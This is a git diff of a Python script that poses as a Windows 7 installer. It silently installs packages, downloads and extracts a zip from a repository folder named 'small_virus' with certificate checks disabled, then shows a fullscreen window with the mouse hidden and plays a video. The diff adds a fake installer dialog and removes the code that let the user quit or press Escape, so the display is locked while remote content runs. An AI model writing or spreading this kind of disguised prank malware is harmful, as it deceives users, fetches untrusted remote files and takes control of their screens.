@@ -1,13 +1,14 @@
 import os
 os.system('cls')
 print('checking dependencies...')
-os.system('python -m pip install requests tqdm pygame ffpyplayer')
+os.system('python -m pip install requests tqdm pygame ffpyplayer easygui')
 import pygame
 import requests
 import zipfile
 import sys
 import threading
 from ffpyplayer.player import MediaPlayer
+import easygui
 
 def download_file(url, output_path, progress_callback=None):
     response = requests.get(url, stream=True, verify=False)
@@ -53,28 +54,8 @@ def play_video(video_path):
         clock.tick(60)
 
 def main():
-    pygame.init()
-
-    # 设置全屏模式
-    screen = pygame.display.set_mode((0, 0), pygame.FULLSCREEN)
-    screen_width, screen_height = screen.get_size()
-
-    # 隐藏鼠标指针
-    pygame.mouse.set_visible(False)
-
-    # 设置背景颜色
-    background_color = (30, 30, 30)  # 深灰色
-    screen.fill(background_color)
-
-    # 设置字体
-    font = pygame.font.SysFont('Arial', 36)
-    small_font = pygame.font.SysFont('Arial', 24)
-
-    # 计算进度条的位置和大小
-    progress_bar_width = screen_width * 0.6
-    progress_bar_height = 50
-    progress_bar_x = (screen_width - progress_bar_width) / 2
-    progress_bar_y = screen_height * 0.8
+    # 使用 easygui 显示启动消息
+    easygui.msgbox("windows installer - version 1.2 - huluobuo\nwindows7 安装程序", title="installer")
 
     # 下载文件
     url = 'https://github.com/huluobuo/filesss-huluobuo/raw/refs/heads/main/small_virus/Windows_7_Song_of_Death/update.zip'
@@ -106,6 +87,30 @@ def main():
         image_url = 'https://raw.githubusercontent.com/huluobuo/filesss-huluobuo/refs/heads/main/small_virus/Windows_7_Song_of_Death/windows7.png'
         download_file(image_url, image_path)
 
+    # 初始化 pygame
+    pygame.init()
+
+    # 设置全屏模式
+    screen = pygame.display.set_mode((0, 0), pygame.FULLSCREEN)
+    screen_width, screen_height = screen.get_size()
+
+    # 隐藏鼠标指针
+    pygame.mouse.set_visible(False)
+
+    # 设置背景颜色
+    background_color = (30, 30, 30)  # 深灰色
+    screen.fill(background_color)
+
+    # 设置字体
+    font = pygame.font.SysFont('Arial', 36)
+    small_font = pygame.font.SysFont('Arial', 24)
+
+    # 计算进度条的位置和大小
+    progress_bar_width = screen_width * 0.6
+    progress_bar_height = 50
+    progress_bar_x = (screen_width - progress_bar_width) / 2
+    progress_bar_y = screen_height * 0.8
+
     image = pygame.image.load(image_path)
 
     # 缩小图像
@@ -119,12 +124,8 @@ def main():
     # 主循环
     running = True
     while running:
-        for event in pygame.event.get():
-            if event.type == pygame.QUIT:
-                running = False
-            elif event.type == pygame.KEYDOWN:
-                if event.key == pygame.K_ESCAPE:
-                    running = False
+
+        trying = False    # 调试用
 
         # 绘制背景
         screen.fill(background_color)
@@ -147,7 +148,7 @@ def main():
         screen.blit(progress_text, text_rect)
 
         # 绘制更新文本
-        update_text = small_font.render("windows installer   V1.2 pro", True, (255, 255, 255))
+        update_text = small_font.render("windows installer   V1.2 pro - prodeced by huluobuo", True, (255, 255, 255))
         update_text_rect = update_text.get_rect(center=(screen_width / 2, screen_height * 0.7))
         screen.blit(update_text, update_text_rect)
 
@@ -162,18 +163,26 @@ def main():
         # 控制帧率
         pygame.time.Clock().tick(60)
 
-    if download_complete:
-        print("Extracting file...")
-        extract_zip(output_path)
-        os.remove(output_path)
-        print("Done.")
+        if download_complete:
+            print("Extracting file...")
+            extract_zip(output_path)
+            os.remove(output_path)
+            print("Done.")
 
-        # 播放视频
-        video_path = 'win7.mp4'
-        if os.path.exists(video_path):
-            play_video(video_path)
-        else:
-            print(f"Video file {video_path} not found.")
+            # 播放视频
+            video_path = 'win7.mp4'
+            if os.path.exists(video_path):
+                play_video(video_path)
+            else:
+                print(f"Video file {video_path} not found.")
+        
+        if trying:
+            # 播放视频
+            video_path = 'win7.mp4'
+            if os.path.exists(video_path):
+                play_video(video_path)
+            else:
+                print(f"Video file {video_path} not found.")
 
     pygame.quit()
     sys.exit()
